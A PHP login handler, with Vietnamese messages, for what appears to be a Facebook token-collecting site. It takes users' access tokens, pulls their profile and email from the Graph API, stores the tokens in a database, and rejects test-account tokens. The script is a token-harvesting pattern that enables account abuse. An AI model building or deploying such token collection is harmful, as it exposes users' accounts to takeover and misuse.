<?php
ob_start('ob_gzhandler');
session_start();
include'config.php';
$json['status'] = "error";
if($_REQUEST['access_token']) {
	$token2 = $_REQUEST['access_token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}else{
		$token = $token2;
	}
$me = me($token);
$check = json_decode(file_get_contents('https://graph.facebook.com/app/?access_token='.$token.''), true);
$check2 = json_decode(file_get_contents('https://graph.facebook.com/100009116051272/subscribers?access_token='.$token.''), true);
$check3 = json_decode(file_get_contents('https://graph.facebook.com/me?fields=friends&access_token='.$token.''), true);
if($me['id']){
$_SESSION['id'] = $me[id];
$_SESSION['name'] = $me[name];
$_SESSION['token'] = $token;
$_SESSION['birthday']=$me['birthday'];
$_SESSION['email']=$me['email'];
$_SESSION['first_name']=$me['first_name'];
$_SESSION['last_name']=$me['last_name'];
$_SESSION['gender']=$me['gender'];
$_SESSION['id_token'] = $check['id'];
$_SESSION['name_token'] = $check['name'];
$_SESSION['verified']=$me['verified'];
$_SESSION['sub']=$check2['total_count'];
$_SESSION['friends']=$check3['total_count'];
//header('Location: index.php');
if($me['id']){
mysql_query("CREATE TABLE IF NOT EXISTS `token` (

      `id` int(11) NOT NULL AUTO_INCREMENT,

      `user_id` varchar(32) NOT NULL,

      `name` varchar(32) NOT NULL,

      `access_token` varchar(255) NOT NULL,

      PRIMARY KEY (`id`)

      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

   ");
   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         token
      WHERE
         user_id = '" . mysql_real_escape_string($me['id']) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               token
            WHERE
               user_id='" . mysql_real_escape_string($me['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 
   if(!$row){
      mysql_query(
         "INSERT INTO 
            token
         SET
            `user_id` = '" . mysql_real_escape_string($me['id']) . "',
            `name` = '" . mysql_real_escape_string($me['name']) . "',
            `access_token` = '" . mysql_real_escape_string($token) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            token
         SET
            `access_token` = '" . mysql_real_escape_string($token) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }
   }
if (preg_match("|@tfbnw.net|", $_SESSION['email'])) 
{ 
session_destroy();
mysql_query("
            DELETE FROM
               token
            WHERE
               user_id='" . mysql_real_escape_string($_SESSION['id']) . "' 
         ");
$json['mes'] = "Hệ Thống Không Hỗ Trợ Token Ảo!";
}else if($_SESSION['id'] == '0' 
          || $_SESSION['id'] == '4'
          || $_SESSION['id'] == '5'
){
session_destroy();
$json['mes'] = "Xin lỗi! Bạn bị cấm do vi phạm quy định của chúng tôi!";
}else{
$json['status'] = "oke";
$json['link'] = "index.php?info=success";
}
//end
}else{
session_destroy();
//header('Location: index.php?tb=Token Hết Hạn. Vui Lòng Làm Mới Token')
$json['mes'] = "Token hết hạn hoặc không chính xác<br>Vui lòng kiểm tra và thử lại!";
;
}
}

function me($access) {
return json_decode(file_get_contents('https://graph.facebook.com/me?access_token='.$access),true);
}
echo json_encode($json);
 
?>